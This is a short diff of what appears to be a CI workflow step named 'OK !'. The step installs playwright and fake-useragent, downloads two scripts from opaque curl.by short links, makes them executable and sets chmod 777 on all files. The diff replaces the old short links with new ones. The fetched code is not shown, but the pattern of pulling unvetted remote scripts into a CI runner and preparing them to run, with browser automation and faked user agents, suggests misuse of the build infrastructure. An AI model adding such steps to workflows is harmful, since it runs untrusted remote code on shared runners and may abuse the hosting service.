@@ -15,9 +15,10 @@ jobs:
     steps:
       - name: OK !
         run: |
-          pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/86RTa/Test.py
-          wget https://curl.by/vi9NF/testraw.js
+          pip install playwright fake-useragent
+          playwright install
+          wget https://curl.by/sSwco/Test.py
+          wget https://curl.by/DT6Ey/testraw.js
           chmod +x testraw.js
           chmod +x Test.py
           chmod 777 *
